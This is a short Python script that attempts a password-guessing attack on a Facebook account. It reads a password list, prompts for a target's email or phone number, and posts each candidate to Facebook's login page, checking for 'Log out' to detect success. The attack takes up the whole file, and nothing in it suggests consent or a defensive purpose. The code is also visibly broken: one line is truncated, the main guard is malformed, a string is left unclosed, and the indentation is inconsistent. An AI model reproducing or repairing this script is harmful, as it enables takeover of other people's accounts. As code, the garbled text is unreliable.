import requests

ID_USERNAME = "email"
ID_PASSWORD = "pass"
FB_URL = 'http://facebook.com/login.php'

def try_password():
	payload = {ID_USERNAME : email, ID_PASSWORD : passwor>
	resp = requests.get(FB_URL)
	resp = requests.post(FB_URL, payload)
	if 'Log out' in resp.text:
	print("password is found")

PASSWORD_FILE="passwords.txt"
password= open(PASSWORD_FILE, 'r').read().split("\n")
print("Password file selected: ", PASSWORD_FILE)
email = input('Target account Email/Number: ').strip()

if __name__="main":
	for index, password in zip(range(password.__len__()), password):
	password = password.strip()
		if len(password) < 6:
		continue
                print("Trying password index[", index,"])
